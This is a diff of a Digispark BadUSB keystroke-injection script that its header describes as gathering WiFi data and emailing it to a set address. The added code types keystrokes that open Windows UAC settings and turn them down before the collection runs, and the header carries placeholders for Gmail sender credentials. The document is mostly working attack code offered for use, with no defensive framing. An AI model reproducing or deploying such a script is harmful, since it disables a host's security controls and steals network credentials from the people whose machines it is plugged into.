@@ -1,13 +1,43 @@
 /********************************************************************************
-  Gather WiFi data and email it,  !!!Need admin privileges and uac at default!!! 
-  Change line 27 and 48 ('Desktop') to location you want file saved
-  Change line 48 'GMAIL_USERNAME'<-username ONLY, ;GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
-  Change line 67 to set location file was saved
+  Disable UAC, then gather WiFi data and email it,  !!! Need admin privileges & Full Keyboard usage values @ https://pastebin.com/WhAGg3Jw | Save @ %UserProfile%\AppData\Local\Arduino15\packages\digistump\hardware\avr\1.6.7\libraries\DigisparkKeyboard\DigiKeyboard.h !!! 
+  Change line 55 and 74 ('Desktop') to location you want file saved
+  Change line 74 'GMAIL_USERNAME'<-username ONLY, ;GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
+  Change line 91 to set location file was saved
   CREDIT: C4PT14ND34DP00L
 *******************************************************************************/
 
 #include "DigiKeyboard.h"
 void setup() {
+  
+  //Disable UAC (requires admin privileges)
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_L_GUI);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.print("uac");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.delay(100);
+  
+  //Gather Wifi data & save file
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
@@ -15,8 +45,6 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_A);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);    //comment out if uac is off
   DigiKeyboard.delay(800);
   DigiKeyboard.print("COLOR EF");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -36,8 +64,6 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_A);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);    //comment out if uac is off
   DigiKeyboard.delay(800);
   DigiKeyboard.print("COLOR EF");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -53,8 +79,6 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_A);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);    //comment out if uac is off
   DigiKeyboard.delay(800);
   DigiKeyboard.print("COLOR EF");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -83,7 +107,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
   
-  //Light up the onboard LED when the script is done
+  //Light up onboard LED when script is done
   int ledPin = 1;
   digitalWrite(ledPin, HIGH);
 }
